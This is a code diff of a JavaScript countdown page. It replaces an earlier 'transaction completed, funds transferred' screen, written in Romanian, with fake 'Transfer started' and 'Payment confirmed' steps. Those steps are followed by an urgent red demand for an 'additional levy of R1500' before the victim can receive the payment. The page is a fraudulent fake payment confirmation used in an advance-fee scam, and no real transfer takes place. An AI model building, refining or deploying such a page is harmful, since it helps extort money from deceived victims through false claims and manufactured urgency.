@@ -816,44 +816,33 @@ pourcentage + "%";
 tempsTexte.innerHTML =
 temps + " secunde rămase";
 
-if(temps <= 0){
-
-clearInterval(interval);
-document.getElementById("statusTransfer").style.display = "block";
 document.body.innerHTML = `
-<div style="
-position:fixed;
-top:0;
-left:50%;
-transform:translateX(-50%);
-width:100%;
-max-width:390px;
-height:100%;
-">
+<div style="padding:30px;font-family:Arial;background:#fff;height:100vh;">
 
-<img src="Screenshot_20260623-144528.jpg"
-style="
-max-width:100%;
-max-height:80%;
-object-fit:contain;
-">
+<div style="display:flex;align-items:center;margin-bottom:15px;">
+<div style="width:40px;height:40px;border-radius:50%;background:#16a34a;color:#fff;display:flex;justify-content:center;align-items:center;font-size:24px;">✓</div>
+<span style="margin-left:15px;font-size:24px;">Transfer started</span>
+</div>
 
-<p style="
-margin-top:15px;
-color:#00ff66;
-font-size:20px;
-font-weight:bold;
-text-align:center;
-text-shadow:0 0 8px #00ff66;
-">
-✓ Tranzacția a fost finalizată cu succes.<br>
-Fondurile au fost transferate în contul dumneavoastră bancar.
+<div style="width:4px;height:40px;background:#16a34a;margin-left:18px;"></div>
+
+<div style="display:flex;align-items:center;margin:15px 0;">
+<div style="width:40px;height:40px;border-radius:50%;background:#16a34a;color:#fff;display:flex;justify-content:center;align-items:center;font-size:24px;">✓</div>
+<span style="margin-left:15px;font-size:24px;">Payment confirmed</span>
+</div>
+
+<div style="width:4px;height:40px;background:#ddd;margin-left:18px;"></div>
+
+<div style="display:flex;align-items:center;">
+<div style="width:40px;height:40px;border:3px solid #ddd;border-radius:50%;background:#fff;"></div>
+</div>
+
+<p style="margin-top:30px;color:#d00000;font-size:20px;font-weight:bold;line-height:1.6;">
+An additional levy of R1500 is needed urgently now, to conclude the confirmation of the transaction before you can receive your payment.
 </p>
 
 </div>
 `;
-
-}
 
 },1000);
 
